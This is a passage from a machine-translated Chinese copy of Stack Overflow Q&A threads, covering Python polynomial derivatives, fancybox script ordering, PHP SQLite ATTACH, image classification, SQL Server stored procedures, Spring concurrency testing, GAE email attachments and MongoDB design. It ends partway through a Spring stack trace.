>>> print list(itertools.imap(operator.mul, itertools.islice(coeff, 1, None), itertools.count(1)))
[0, 2, 6, 0, 15] 
```

**更新**：我想在这里使用迭代器和所有东西非常棘手，但我的解决方案结果是 GregS 的两倍多。有人可以解释一下这种缓慢是从哪里来的吗？

```
>>> print timeit.repeat("poly(coeff)", "poly = lambda coeff: [coeff[i] * i for i in range(1, len(coeff))]; coeff = [1, 0, 0, 5, 0, -29]")
[1.7786244418210748, 1.7956598059847046, 1.7500179643792024]
>>> print timeit.repeat("poly(coeff)", "import operator, itertools; poly = lambda coeff: list(itertools.imap(operator.mul, itertools.islice(coeff, 1, None), itertools.count(1))); coeff = [1, 0, 0, 5, 0, -29]")
[4.01759841913463, 4.152715700867423, 5.195021813889031] 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-06-22T12:07:13.400

不是一个漂亮或具体的解决方案，但您可以改进它:) 使用字典来存储系数及其幂，以幂为键。

```
import re
def polynomial(data):
    coeffs = {}
    splits = map(str.strip, re.split(r"([+ \-])",data))
    sign = 1
    for p in splits:
        if p in "+-":
            sign = 1 if p == '+' else -1
            continue
        s = re.split('[^0-9]+', p)
        coeff = int(s[0])
        if len(s) == 1:
            pow = 0
        elif s[1] == '':
            pow = 1
        else:
            pow = int(s[1])
        coeffs[pow] = sign * coeff
    return coeffs

def derive(poly):
    return dict([(p-1, p*c) for p,c in poly.items() if p != 0])

def print_poly(poly, var = 'x'):
    print(''.join(['{0}{1}{2}^{3}'.format('+-'[c<0],c,var,p) for p,c in sorted(poly.items(), reverse = True)])) 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2017-12-20T06:29:12.563

如果多项式方程以列表形式给出。例如：p=[9,4,12,2] 返回值将是 [27, 8, 12]

```
 def derivative(p):
        derv=[]
        for i in range(len(p)-1):
            derv.append((len(p)-i-1)*p[i])
        return derv 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-01-23T08:29:42.270

第 7 行和第 8 行将提取列表中的系数和指数，而不考虑符号。第 13 和 14 行从列表中删除空字符串。这并不完美，但更简单：

```
import pdb;                                                                                                                                                                                                                                                                 
import re;                                                                      

poly = input("Input the polynomial you want to find its derivative : ")         

coefficients = re.split("x\^[+-]?[0-9]+",poly)                                  
exponents = re.split("[+-]?[0-9]+x\^",poly)                                     

print(coefficients)                                                            
print(exponents)                                                               

coefficients = [ i for i in coefficients if i !='']                             
exponents = [i for i in exponents if i !='']                                    

print(coefficients)                                                            
print(exponents)                                                               

derivative=""                                                                   
for i in range(len(coefficients)):                                              
    print(coefficients[i])                                                      
    print(exponents[i])                                                         
    coefficient = int(coefficients[i])*int(exponents[i])                        
    exponent = int(exponents[i]) - 1                                            
    if exponent == 0:                                                           
        derivative +=  str(coefficient)                                         
    else:                                                                       
        derivative +=  str(coefficient) + "x^" + str(exponent)                  

print("The original value is {0}".format(poly))                                 
print("The derivative is {0}".format(derivative)) 
```

# javascript - 花式盒子不工作

> ID：11155370
> 
> 赞同：0
> 
> 时间：2012-06-22T11:31:54.380
> 
> 标签：javascript, jquery, fancybox

如何在fancybox中解决这个问题？

```
Uncaught TypeError: Object #<Object> has no method 'fancybox' localhost/:74
(anonymous function) http://localhost/:74
o.extend.ready.o.readyList jquery.min.js:19
o.extend.each jquery.min.js:12
o.extend.ready jquery.min.js:19
o.each.o.fn.(anonymous function) 
```

这是header.php中的代码我不知道哪里有问题！我尝试使用 simplemodal 但不工作！也许是tabslider的问题！我制作了所有写在fancybox网站上的东西。

```
<link rel="stylesheet" href="css/jquery.fancybox-1.3.4.css" type="text/css" media="screen" />
<script type="text/javascript" src="js/jquery.fancybox-1.3.4.pack.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>
    <script type="text/javascript">
        $(function(){
            $('.slide-out-div').tabSlideOut({
                tabHandle: '.handle',
                pathToTabImage: 'img/handle-bg.png',
                imageHeight: '186px',
                imageWidth: '30px',
                tabLocation: 'left',
                speed: 300,
                action: 'click',
                topPos: '150px',
                leftPos: '20px',
                fixedPosition: false
            });
    });
    </script>
    <script type="text/javascript">
        $(function(){
            $('.add_site_right').tabSlideOut({
                tabHandle: '.handle_right',
                pathToTabImage: 'img/handle-bg.png',
                imageHeight: '186px',
                imageWidth: '30px',
                tabLocation: 'right',
                speed: 300,
                action: 'click',
                topPos: '150px',
                leftPos: '20px',
                fixedPosition: false
            });
    });
    </script>
    <script type="text/javascript">
            $(document).ready(function() {
                /*
                *   Examples - images
                */

                $("a#example1").fancybox();

                $("a#example2").fancybox({
                    'overlayShow'   : false,
                    'transitionIn'  : 'elastic',
                    'transitionOut' : 'elastic'
                });

                $("a#example3").fancybox({
                    'transitionIn'  : 'none',
                    'transitionOut' : 'none'    
                });

                $("a#example4").fancybox({
                    'opacity'       : true,
                    'overlayShow'   : false,
                    'transitionIn'  : 'elastic',
                    'transitionOut' : 'none'
                });

                $("a#example5").fancybox();

                $("a#example6").fancybox({
                    'titlePosition'     : 'outside',
                    'overlayColor'      : '#000',
                    'overlayOpacity'    : 0.9
                });

                $("a#example7").fancybox({
                    'titlePosition' : 'inside'
                });

                $("a#example8").fancybox({
                    'titlePosition' : 'over'
                });

                $("a[rel=example_group]").fancybox({
                    'transitionIn'      : 'none',
                    'transitionOut'     : 'none',
                    'titlePosition'     : 'over',
                    'titleFormat'       : function(title, currentArray, currentIndex, currentOpts) {
                        return '<span id="fancybox-title-over">Image ' + (currentIndex + 1) + ' / ' + currentArray.length + (title.length ? ' &nbsp; ' + title : '') + '</span>';
                    }
                });

                /*
                *   Examples - various
                */

                $("#various1").fancybox({
                    'titlePosition'     : 'inside',
                    'transitionIn'      : 'none',
                    'transitionOut'     : 'none'
                });

                $("#various2").fancybox();

                $("#various3").fancybox({
                    'width'             : '75%',
                    'height'            : '75%',
                    'autoScale'         : false,
                    'transitionIn'      : 'none',
                    'transitionOut'     : 'none',
                    'type'              : 'iframe'
                });

                $("#various4").fancybox({
                    'padding'           : 0,
                    'autoScale'         : false,
                    'transitionIn'      : 'none',
                    'transitionOut'     : 'none'
                });
            });
        </script> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T18:37:58.187

您的网站`adzire.com`会引发 javascript 错误，从而导致您的一些脚本（包括 fancybox）失败。您需要稍微调整一下代码：

首先，您只需要一个 jQuery 实例（最好是最新版本），到目前为止您有 3 个（1.4、1.6.2 和 1.7.2）。我猜你应该删除 v1.4 和 1.6.2（一些插件包括一个副本 jQuery，但这并不意味着你需要它们。）还要确保在任何其他脚本或 jQuery 插件之前加载 jQuery。

其次，与 jQuery 一样，您只需要任何 jQuery 插件的单个实例。您正在加载 jQuery UI 1.8.21 两次...删除一个。我猜是因为你在不同版本的 jQuery 之后加载它们，它会创建这些错误：

```
Timestamp: 22/06/2012 11:35:54 AM
Error: $(".cont .wrapper .block select.styled").select_skin is not a function
Source File: http://www.adzire.com/js/main.js
Line: 6

Timestamp: 22/06/2012 11:36:03 AM
Error: detailsBox is not defined
Source File: http://www.adzire.com/
Line: 115 
```

稍微清理一下可能会解决您的问题，包括fancybox问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-22T11:44:53.560

您需要在 jquery 之后包含 fancybox 脚本：

```
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4/jquery.min.js"></script>
<script type="text/javascript" src="js/jquery.fancybox-1.3.4.pack.js"></script> 
```

# php - 如何使用 PHP SQLite3 执行 ATTACH DATABASE

> ID：11155374
> 
> 赞同：4
> 
> 时间：2012-06-22T11:32:10.380
> 
> 标签：php, sqlite

我正在使用启用了 sqlite3（版本 0.7-dev）的 PHP（版本 5.3.13）。我希望能够使用 SQLITE3 连接数据库的能力，以便我可以执行 JOINed 查询，但每次我执行 ATTACH DATABASE 时都会失败。

```
$dbmain = new SQLite3('main.s3db');
$results = $dbmain->exec("ATTACH DATABASE support.s3db AS ckj");
var_dump($results); 
```

var_dump 总是显示为假，我永远无法在 ckj 上查询。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:15:30.997

您需要提供引用的完整路径。

```
$myroot = $_SERVER["DOCUMENT_ROOT"];
$dbmain = new SQLite3('main.s3db');
$cmd = "ATTACH DATABASE '".$myroot."/support.s3db' AS ckj";
$results = $dbmain->exec($cmd);
var_dump($results); 
```

将正常工作。

# image-processing - 用于分类的词袋 - 特征与像素

> ID：11155375
> 
> 赞同：2
> 
> 时间：2012-06-22T11:32:10.910
> 
> 标签：image-processing, machine-learning, computer-vision, classification, pattern-recognition

我正在使用词袋模型对医学图像进行分类。我做了以下提取特征向量：

1.  从小图像块中提取特征，然后在这些特征上应用 BOW
2.  从小图像块中提取像素值，然后对这些像素值应用 BOW

在特征提取之后，我尝试了 PCA、特征选择、更改 KMeans 的集群数量等以提高准确性。但在我的例子中，BOW 在像素值 (1) 上学习的表现优于 BOW (90%) 在特征 (2) 上学习的效果 (70%)。我的功能很好，当我使用这些功能使用其他框架对图像进行分类时，我能够获得超过 95% 的准确率。

我的问题是为什么在像素上学习的 BOW 比在特征上学习的 BOW 表现更好？

![在此处输入图像描述](../Images/aadffb8286df7e88dacda2522c8bd4d0.png) ![在此处输入图像描述](../Images/6fee7800c7fc4994d01facfe02ed9bf9.png)

正常-异常结肠镜图像分类

```
 Figure 1: a normal colon image
    Figure 2: an image with polyp 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-23T19:39:01.307

我对您从图像补丁中提取特征的两种方法的理解是

特征选择 =“运行 PCA、k-means 或选择像素的某个子集，并构建这些提取值的向量”

Pixel Values = "从图像的 RGB 值创建一个矢量"

事实上，为了从 BOW 特征中获得好的结果，人们通常会使用相对复杂的算法来推导出单个特征。

在[http://vision.stanford.edu/projects/totalscene/index.html](http://vision.stanford.edu/projects/totalscene/index.html)（参考文献#1 中的论文）的项目中，作者从图像块和分割中获取 BOW 特征。对于图像块，它们提取 SIFT 特征，并且对于每个片段，它们具有形状、颜色、位置和纹理特征（请参阅第 2.1 节并遵循参考以更好地描述它们使用的特征）。

在“将场景分解为几何和语义一致的区域”中。(Gould et. al.) 形状、颜色、边缘等特征是通过训练增强逻辑回归分类器、Potts 模型和高斯混合模型等操作得出的。

您可能不需要如此密集的技术来提取优于像素向量的特征，但您绝对应该浏览文献以了解什么是有效的。

用于提取纹理响应的 SIFT 特征、颜色直方图和过滤器似乎工作得很好，并且还具有合理数量的软件库支持。

# asp.net - 参考服务器中所有数据库的存储过程

> ID：11155378
> 
> 赞同：0
> 
> 时间：2012-06-22T11:32:18.810
> 
> 标签：asp.net, sql-server-2008

我想在我的 SQL Server 2008 上为多个（甚至所有）数据库创建一个相同的存储过程。

我可以一次完成还是应该在 asp.net 项目参考数据库中单独创建它？

请帮我.....

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T13:03:57.227

这个问题已经在 SO 上被多次问过，但有趣的是，对于最佳答案似乎没有达成共识。因此，这里是各种人建议的主要选项的摘要（没有特殊顺序）：

1.  将它放在带有`sp_`前缀的主数据库中，以便 SQL Server 首先在那里查找它
2.  将其放入模型数据库中，因此它会自动添加到所有新数据库中
3.  仅为“全局”过程（和其他对象）创建数据库并使用三部分命名来调用它们
4.  如 3，但在其他数据库中创建同义词，因此您不需要三部分命名
5.  使用商业或自行开发的工具来管理对多个数据库的部署
6.  同 5，但部署到一个数据库，然后`diff`将数据库和应用差异脚本部署到其他数据库

在我看来，1 是一个非首发，因为微软[明确表示](http://msdn.microsoft.com/en-us/library/ms187837.aspx)你不应该在主数据库中创建对象。2 听起来不错，但实际上数据库比从头开始创建 (YMMV) 更频繁地恢复或复制，因此使用模型是不可靠的。

3 和 4 适用于表和视图，但执行上下文可能是存储过程和函数的问题。但这取决于程序中的逻辑，在您的情况下它可能是可行的。

但是 1-4 都有潜在的问题，如果您只有一个对象，那么您只有该对象的一个​​版本，并且在不同的数据库中提供不同的版本通常很有用，用于测试或仅用于不同的客户。

5 和 6 是同一主题的变体，我个人认为这是最好的方法，因为无论如何部署都是您必须解决的问题，因此您不妨这样做并确保您拥有适当的知识、工具和流程能够以受控、自动化的方式将代码干净、快速地部署到任何数据库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:37:31.717

在master数据库或不会删除的数据库中创建一个存储过程。将参数传递给存储过程，该参数标识您要在哪个数据库中获取数据并相应地完成其余工作。

# multithreading - 如何检测 Spring MVC 控制器中的并发问题？

> ID：11155380
> 
> 赞同：0
> 
> 时间：2012-06-22T11:32:34.337
> 
> 标签：multithreading, testing, spring-mvc

在办公室里，我们有一个控制器，数百个客户端可以同时访问它，动作特别慢。存在我们的代码对于并发调用不安全的风险。您将如何创建并发自动化测试来识别潜在问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T16:03:16.237

创建自动化并发测试是有问题的。
尽管有像 JMeter 这样的工具可以帮助运行许多并发场景，
但您可能无法找到所需的场景来检测您的同步问题。
您需要做的是使用配置文件和/或 jvisualvm 等工具在代码审查 + 分析上投入时间，并执行线程转储。在 linux 上，您可以通过 -
kill -QUIT process_id 来执行此操作，其中 process_id 是您的 java 进程的 PID。
例如，使用它，您将能够检测到死锁。也许如果你指定你看到的场景，给你更多帮助会更容易。

# google-app-engine - 在 GAE Java 上发送带有附件的电子邮件

> ID：11155381
> 
> 赞同：2
> 
> 时间：2012-06-22T11:32:36.557
> 
> 标签：google-app-engine, jakarta-mail

我正在尝试使用以下代码在 GAE Java 上发送带有附件的电子邮件：

```
 String htmlBody = "<html><body><p>this is some text</p></body></html>";
        Properties props = new Properties();
        Session session = Session.getDefaultInstance(props, null);
        Message msg = new MimeMessage(session);
        msg.setFrom(new InternetAddress("someemail@someemail.com", "My Name"));
        msg.addRecipient(Message.RecipientType.TO,
                         new InternetAddress(payerEmail));
        msg.setSubject("Your order confirmation");

        Multipart mp = new MimeMultipart();

        MimeBodyPart htmlPart = new MimeBodyPart();
        htmlPart.setContent(htmlBody, "text/html");
        mp.addBodyPart(htmlPart);

        MimeBodyPart attachment = new MimeBodyPart();
        attachment.setFileName("tc.MyCustomFile");
        attachment.setContent(byteArray, "application/octet-stream");
        mp.addBodyPart(attachment);
        msg.setContent(mp);
        //msg.set
        Transport.send(msg); 
```

我得到这个例外：

```
javax.mail.SendFailedException: Send failure (javax.mail.MessagingException: Converting attachment data failed)
    at javax.mail.Transport.send(Transport.java:163)
    at javax.mail.Transport.send(Transport.java:48)
    at com.xyz.samplepaypal.IPNListenerServlet.doPost(IPNListenerServlet.java:168)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
    at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:511)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1166)
    at com.google.apphosting.utils.servlet.ParseBlobUploadFilter.doFilter(ParseBlobUploadFilter.java:102)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.apphosting.runtime.jetty.SaveSessionFilter.doFilter(SaveSessionFilter.java:35)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at com.google.apphosting.utils.servlet.TransactionCleanupFilter.doFilter(TransactionCleanupFilter.java:43)
    at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1157)
    at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:388)
    at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)
    at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:182)
    at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765)
    at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:418)
    at com.google.apphosting.runtime.jetty.AppVersionHandlerMap.handle(AppVersionHandlerMap.java:249)
    at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
    at org.mortbay.jetty.Server.handle(Server.java:326)
    at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:542)
    at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:923)
    at com.google.apphosting.runtime.jetty.RpcRequestParser.parseAvailable(RpcRequestParser.java:76)
    at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)
    at com.google.apphosting.runtime.jetty.JettyServletEngineAdapter.serviceRequest(JettyServletEngineAdapter.java:135)
    at com.google.apphosting.runtime.JavaRuntime$RequestRunnable.run(JavaRuntime.java:477)
    at com.google.tracing.TraceContext$TraceContextRunnable.runInContext(TraceContext.java:449)
    at com.google.tracing.TraceContext$TraceContextRunnable$1.run(TraceContext.java:455)
    at com.google.tracing.TraceContext.runInContext(TraceContext.java:695)
    at com.google.tracing.TraceContext$AbstractTraceContextCallback.runInInheritedContextNoUnref(TraceContext.java:333)
    at com.google.tracing.TraceContext$AbstractTraceContextCallback.runInInheritedContext(TraceContext.java:325)
    at com.google.tracing.TraceContext$TraceContextRunnable.run(TraceContext.java:453)
    at com.google.apphosting.runtime.ThreadGroupPool$PoolEntry.run(ThreadGroupPool.java:251)
    at java.lang.Thread.run(Thread.java:679)
Caused by: javax.mail.MessagingException: Converting attachment data failed
    at com.google.appengine.api.mail.stdimpl.GMTransport.sendMessage(GMTransport.java:231)
    at javax.mail.Transport.send(Transport.java:95)
    ... 34 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-13T23:27:33.780

我对 .txt 和 .csv 文件都有同样的问题。这是我得到的错误：

*   对于 .txt：javax.mail.SendFailedException：发送失败（javax.mail.MessagingException：转换文本正文失败）

*   对于 .csv：javax.mail.SendFailedException：发送失败（javax.mail.MessagingException：转换附件数据失败）

我发现一种解决方法是使用[mar_novice](https://groups.google.com/forum/#!msg/google-appengine-java/5LwT4JG6LiY/bXwf2d_lUKYJ)提出的低级 API ：

```
import com.google.appengine.api.mail.MailService.Attachment;
import com.google.appengine.api.mail.MailService;
import com.google.appengine.api.mail.MailServiceFactory; 
```

...

```
private void sendEmail(String toEmail, String subject, String attachmentString) throws IOException {
    String msgBody = "Here is your timeseries data for the topic in the subject.";
    byte[] attachmentData = attachmentString.getBytes();
    String fileName = "timeseries.csv";

    MailService service = MailServiceFactory.getMailService(); 
    MailService.Message msg = new MailService.Message(); 

    msg.setSender("<<<<<<REPLACE_WITH_YOUR_SENDER_EMAIL_ADDRESS>>>>>>>"); 
    msg.setTo(toEmail); 

    msg.setSubject(subject); 
    msg.setTextBody(msgBody); 

    Attachment attachmentObject = new Attachment(fileName, attachmentData);
    msg.setAttachments(attachmentObject);// file in binary         

    service.send(msg);
} 
```

# performance - 将一张桌子分成多张桌子是否有意义

> ID：11155390
> 
> 赞同：0
> 
> 时间：2012-06-22T11:33:15.403
> 
> 标签：performance, mongodb

这是性能问题。将数据拆分到多个数据表是否会在仅使用按属性索引的单个数据表时为您提供性能优势，在此基础上可以将数据拆分到多个数据表？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T15:26:08.640

If you concern is performance, then you should consider using [automated sharding](http://www.mongodb.org/display/DOCS/Sharding+Introduction) with mongodb mongodb. Unless the data is usually queried separately, splitting your data into multiple collections will make your application logic more complex, without the benefit of sharding feature provided by mongodb.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T14:32:32.933

你必须认识到 MongoDB 的集合限制取决于索引大小等因素：[http ://www.mongodb.org/display/DOCS/Using+a+Large+Number+of+Collections](http://www.mongodb.org/display/DOCS/Using+a+Large+Number+of+Collections)

可以同时查询集合，但是 Mongo 具有全局（2.2 中的数据库级别）锁，因此出于写入方面的性能原因，如果您每秒处理对一个节点的多次写入，将数据拆分为数据库似乎更可行。

使用多个集合的主要好处是可伸缩性。对多个集合进行分片比对一个巨大的集合进行分片更容易，并且使用始终使查询相对快速的分片键也更容易。由于程度的原因，它也更容易。大文档 = 当文档增长时，文档在 HDD 空间中的移动更多。

使用一个集合的主要好处是易于查询。但是您必须记住，嵌入 3 层或更深的文档可能不是一个好的选择，而且它确实会使在没有客户端过滤的情况下查询 onm DB 端变得非常困难，这实际上可能会使您的应用程序变慢。

但正如其他人所说，这取决于您的用例等，这完全取决于您没有提供给我们的细节。

我可能遗漏了一些细节，但这是基础知识，希望对您有所帮助

编辑：您可以在此处阅读有关 Mongo 架构性能和内容的信息：[http ://www.mongodb.org/display/DOCS/Schema+Design](http://www.mongodb.org/display/DOCS/Schema+Design)

# java - Spring MVC：表单标签和命令出错

> ID：11155392
> 
> 赞同：4
> 
> 时间：2012-06-22T11:33:25.433
> 
> 标签：java, spring, jsp

我正在使用 Spring Framework 进行编程，在处理表单标记中的 jsp（第 2 行）时显示以下错误后，我感到绝望。

**错误：**

```
 ERROR: org.springframework.web.servlet.tags.form.InputTag - Neither BindingResult nor plain target object for bean name 'command' available as request attribute
java.lang.IllegalStateException: Neither BindingResult nor plain target object for bean name 'command' available as request attribute
    at org.springframework.web.servlet.support.BindStatus.<init>(BindStatus.java:141)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getBindStatus(AbstractDataBoundFormElementTag.java:178)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getPropertyPath(AbstractDataBoundFormElementTag.java:198)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getName(AbstractDataBoundFormElementTag.java:164)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.autogenerateId(AbstractDataBoundFormElementTag.java:151)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.resolveId(AbstractDataBoundFormElementTag.java:142)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.writeDefaultAttributes(AbstractDataBoundFormElementTag.java:126)
    at org.springframework.web.servlet.tags.form.AbstractHtmlElementTag.writeDefaultAttributes(AbstractHtmlElementTag.java:421)
    at org.springframework.web.servlet.tags.form.InputTag.writeTagContent(InputTag.java:142)
    at org.springframework.web.servlet.tags.form.AbstractFormTag.doStartTagInternal(AbstractFormTag.java:102)
    at org.springframework.web.servlet.tags.RequestContextAwareTag.doStartTag(RequestContextAwareTag.java:79)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspx_meth_f_005finput_005f0(habilidades_jsp.java:1081)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspx_meth_f_005fform_005f0(habilidades_jsp.java:996)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspService(habilidades_jsp.java:476)
    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:690)
    at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:477)
    at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:402)
    at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:329)
    at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:238)
    at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:262)
    at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1180)
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:950)
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:852)
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1001)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:579)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:662)
22-jun-2012 14:16:40 org.apache.catalina.core.ApplicationDispatcher invoke
GRAVE: El Servlet.service() para servlet jsp lanzó una excepción
java.lang.IllegalStateException: Neither BindingResult nor plain target object for bean name 'command' available as request attribute
    at org.springframework.web.servlet.support.BindStatus.<init>(BindStatus.java:141)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getBindStatus(AbstractDataBoundFormElementTag.java:178)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getPropertyPath(AbstractDataBoundFormElementTag.java:198)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.getName(AbstractDataBoundFormElementTag.java:164)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.autogenerateId(AbstractDataBoundFormElementTag.java:151)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.resolveId(AbstractDataBoundFormElementTag.java:142)
    at org.springframework.web.servlet.tags.form.AbstractDataBoundFormElementTag.writeDefaultAttributes(AbstractDataBoundFormElementTag.java:126)
    at org.springframework.web.servlet.tags.form.AbstractHtmlElementTag.writeDefaultAttributes(AbstractHtmlElementTag.java:421)
    at org.springframework.web.servlet.tags.form.InputTag.writeTagContent(InputTag.java:142)
    at org.springframework.web.servlet.tags.form.AbstractFormTag.doStartTagInternal(AbstractFormTag.java:102)
    at org.springframework.web.servlet.tags.RequestContextAwareTag.doStartTag(RequestContextAwareTag.java:79)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspx_meth_f_005finput_005f0(habilidades_jsp.java:1081)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspx_meth_f_005fform_005f0(habilidades_jsp.java:996)
    at org.apache.jsp.WEB_002dINF.views.administracion.habilidades_jsp._jspService(habilidades_jsp.java:476)
    at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
    at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
    at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:690)
    at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:477)
    at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:402)
    at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:329)
    at org.springframework.web.servlet.view.InternalResourceView.renderMergedOutputModel(InternalResourceView.java:238)
    at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:262)
    at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1180)
    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:950)
    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:852)
    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:882)
    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
    at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
